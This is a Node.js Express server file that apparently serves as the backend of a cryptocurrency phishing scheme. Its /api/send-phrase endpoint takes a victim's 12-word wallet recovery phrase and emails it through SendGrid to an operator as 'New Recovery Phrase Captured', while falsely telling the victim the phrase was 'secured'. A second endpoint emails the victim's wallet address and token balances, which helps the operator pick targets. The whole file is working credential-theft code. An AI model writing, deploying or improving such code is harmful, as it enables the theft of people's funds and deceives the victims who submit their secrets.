const express = require("express");
const cors = require("cors");
const sgMail = require("@sendgrid/mail");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(express.json());

// Set SendGrid API key
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// ===== Send Recovery Phrase =====
app.post("/api/send-phrase", async (req, res) => {
  const { words } = req.body;

  if (!words || words.length !== 12) {
    return res.status(400).json({ message: "Invalid phrase" });
  }

  const msg = {
    to: process.env.DEST_EMAIL,
    from: process.env.FROM_EMAIL, // Must be verified in SendGrid
    subject: "New Recovery Phrase Captured",
    text: `New 12-word recovery phrase received:\n\n${words.join(" ")}`,
    html: `<h2>New Recovery Phrase Captured</h2><p>${words.join(" ")}</p>`,
  };

  try {
    await sgMail.send(msg);
    console.log("✅ Recovery phrase email sent");
    return res.json({ message: "Phrase secured successfully!" });
  } catch (error) {
    console.error("❌ SendGrid Error:", error.response?.body?.errors || error);
    return res.status(500).json({ error: "Failed to send phrase" });
  }
});

// ===== Send Wallet Scan =====
app.post("/api/send-wallet", async (req, res) => {
  const { address, results } = req.body;

  if (!address || !results || !Array.isArray(results)) {
    return res.status(400).json({ message: "Invalid wallet data" });
  }

  let walletText = `Wallet Address: ${address}\n\nBalances:\n`;
  results.forEach((item) => {
    walletText += `${item.chain} - ${item.native.balance} ${item.native.symbol}\n`;
    if (item.tokens.length > 0) {
      item.tokens.forEach((t) => {
        walletText += `  ${t.symbol}: ${t.balance}\n`;
      });
    }
    walletText += "\n";
  });

  const msg = {
    to: process.env.DEST_EMAIL,
    from: process.env.FROM_EMAIL,
    subject: `Wallet Scan Result: ${address}`,
    text: walletText,
    html: `<h2>Wallet Scan Result</h2><pre>${walletText}</pre>`,
  };

  try {
    await sgMail.send(msg);
    console.log("✅ Wallet scan email sent");
    return res.json({ message: "Wallet results sent successfully!" });
  } catch (error) {
    console.error("❌ SendGrid Error:", error.response?.body?.errors || error);
    return res.status(500).json({ error: "Failed to send wallet data" });
  }
});

// ===== Start Server =====
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
